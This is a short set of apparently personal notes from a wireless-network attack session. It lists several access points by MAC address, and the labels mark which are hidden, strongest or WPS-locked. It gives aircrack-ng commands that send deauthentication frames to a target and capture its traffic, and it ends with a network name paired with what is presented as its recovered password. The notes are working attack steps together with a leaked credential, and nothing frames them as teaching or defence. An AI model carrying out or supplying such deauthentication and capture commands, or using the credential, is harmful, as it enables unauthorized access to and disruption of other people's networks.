02:15:6D:64:20:96 - open hidden
9C:D2:4B:4A:32:F6 - strongest cyta
14:60:80:6B:6A:F1 - strongest Theoros - locked wps
DC:9F:DB:5A:00:C9

aireplay-ng -0 2 -a 02:15:6D:64:20:96 mon0

airodump-ng -c 1  mon0 --bssid 34:31:C4:4E:90:23
aireplay-ng -0 2 -a 02:15:6D:64:20:96 mon0



airodump-ng -c 1  mon0


00:24:17:33:4D:0F  - CYTA792A58 -pass FF0B67F5D4
